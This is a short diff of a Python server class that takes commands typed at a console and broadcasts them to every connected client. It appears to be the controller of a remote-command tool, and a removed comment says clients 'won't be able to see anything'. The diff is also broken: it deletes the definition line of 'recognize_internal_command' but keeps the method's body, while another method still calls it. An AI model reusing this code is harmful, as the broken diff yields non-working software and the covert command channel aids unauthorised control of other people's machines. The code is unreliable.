@@ -83,8 +83,7 @@ class Server():
         self.read_cfg()
         #starts the listening thread(for clients)
         threading.Thread(target=self.listen).start()
-    #used for internal commands, will send the client our command anyway. It's not like that it matters 'cuz they won't be able to see anything
-    def recognize_internal_command(self):
+    #used for internal commands
         #need to use the global for this, otherwise we'd get an error
         global clients
         #just checking for recognized commands
@@ -103,13 +102,14 @@ class Server():
         else:
             if not self.supress_message:
                 print("Need help? Type 'help' or 'shm' to supress this message")
+            self.send_all_comms(self.command)
     #function(we thread this one) for receiving input and sending it to the client
     def commands(self):
         while True:
             self.command = input("command->")
             #we call all the functions here
             self.recognize_internal_command()
-            self.send_all_comms(self.command)
+            #self.send_all_comms(self.command)
     #this one sends all clients a command
     def send_all_comms(self, command):
         #using global again so there aren't any errors
